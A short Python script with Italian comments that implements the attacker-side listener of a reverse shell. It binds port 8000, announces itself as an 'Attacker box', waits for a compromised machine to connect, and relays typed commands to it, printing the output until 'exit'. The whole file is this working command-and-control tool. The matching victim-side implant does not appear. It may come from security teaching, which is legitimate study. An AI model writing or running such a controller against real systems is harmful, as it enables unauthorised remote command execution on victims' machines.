from socket import *
serverPort = 8000
serverSocket = socket(AF_INET, SOCK_STREAM)                 # creazione socket TCP IPv4
serverSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)        # consente al so di riutilizzare un socket utilizzato di recente
serverSocket.bind(('', serverPort))                         # utilizza l'indirizzo di default della macchina
serverSocket.listen(1)                                      # ascoltiamo le connessioni - 1 in questo caso
print("Attacker box listening and awaiting instructions")
connectionSocket, addr = serverSocket.accept()              # accettiamo la connessione
print("Thanks for connecting to me " + str(addr))
message = connectionSocket.recv(1024)
print(message)
command = ""
while command != "exit":
    command = input("Please enter a command: ")
    connectionSocket.send(command.encode())
    message = connectionSocket.recv(1024).decode()
    print(message)

connectionSocket.shutdown(SHUT_RDWR)                        # uscita veloce
connectionSocket.close()